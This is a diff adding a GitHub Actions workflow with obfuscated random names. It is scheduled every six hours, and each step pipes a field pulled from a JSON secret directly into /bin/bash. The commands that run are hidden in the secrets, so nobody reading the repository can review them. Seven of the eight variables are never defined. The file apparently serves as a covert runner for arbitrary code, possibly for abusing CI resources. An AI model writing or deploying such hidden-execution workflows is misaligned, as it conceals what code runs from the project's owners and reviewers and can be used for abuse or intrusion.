@@ -1,0 +1,24 @@
+name: xiangshuoamaman
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiangshuoamaman
+        env:
+          ivue7806: ${{ secrets.ivue7806 }}
+        run: |
+          echo $ivue7806 | jq -r .qk134 | /bin/bash
+          echo $tboi597 | jq -r .tjzso413 | /bin/bash
+          echo $w236 | jq -r .pm59 | /bin/bash
+          echo $p23138 | jq -r .iptf35 | /bin/bash
+          echo $el9 | jq -r .fh24415 | /bin/bash
+          echo $wv3 | jq -r .c757 | /bin/bash
+          echo $cazz02 | jq -r .ztqp5637 | /bin/bash
+          echo $oyygg4 | jq -r .pv8723 | /bin/bash
+
